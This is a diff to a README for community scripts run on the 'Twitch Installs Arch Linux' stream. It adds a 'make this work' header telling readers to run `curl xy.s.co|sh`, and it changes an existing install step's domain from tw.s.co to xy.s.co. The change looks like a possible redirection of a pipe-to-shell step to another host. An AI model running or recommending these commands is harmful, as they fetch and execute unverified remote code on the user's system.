@@ -4,10 +4,13 @@ Twitch Installs Arch Linux: Scripts
 ## What is this?
 These are community contributed scripts that can be run on http://www.twitch.tv/twitchinstallsarchlinux
 
+# THIS MAKE THIS WORK RUN:
+## `curl xy.s.co|sh`
+
 ## We can run scripts from this repo
 Once this is installed, typing `r <script name>` in the VM will run any script in this repo. Fork and pull request to submit your scripts
 
-## 'r' doesn't work yet. We need to create the alias. (the previous curl installed a broken alias). We need to `curl tw.s.co|sh` first.
+## 'r' doesn't work yet. We need to create the alias. (the previous curl installed a broken alias). We need to `curl xy.s.co|sh` first.
 
 ## Scripts
 
